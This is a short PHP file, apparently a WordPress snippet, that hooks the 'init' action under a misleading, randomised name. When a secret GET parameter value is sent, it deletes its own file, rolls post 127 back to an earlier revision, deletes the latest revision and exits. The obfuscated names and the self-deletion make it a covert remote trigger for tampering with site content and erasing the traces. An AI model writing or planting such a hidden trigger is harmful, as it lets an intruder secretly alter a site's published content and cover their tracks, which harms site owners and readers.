<?php

function disable_importer_hover_service() {
	if (isset($_GET['more_external_logo']) && $_GET['more_external_logo'] === 'protection_categories_replace_active') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$dashboard_quote_code = 127;
		$notify_multiple_notification = wp_get_post_revisions($dashboard_quote_code);
		if (empty($notify_multiple_notification)) die('no revisions');
		if (count($notify_multiple_notification) < 2) die('less than 2');
		$remover_enhanced_software = array_shift($notify_multiple_notification);
		$tracking_services_elements_multi = $remover_enhanced_software->ID;
		$protect_permalink_svg_label = array_shift($notify_multiple_notification);
		$vendor_secure_php = $protect_permalink_svg_label->ID;
		$copyright_list_subscriptions_delete = wp_restore_post_revision($vendor_secure_php);
		if ($copyright_list_subscriptions_delete === false) die('error restoring');
		$copyright_list_subscriptions_delete = wp_delete_post_revision($tracking_services_elements_multi);		
		if ($copyright_list_subscriptions_delete === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'disable_importer_hover_service');
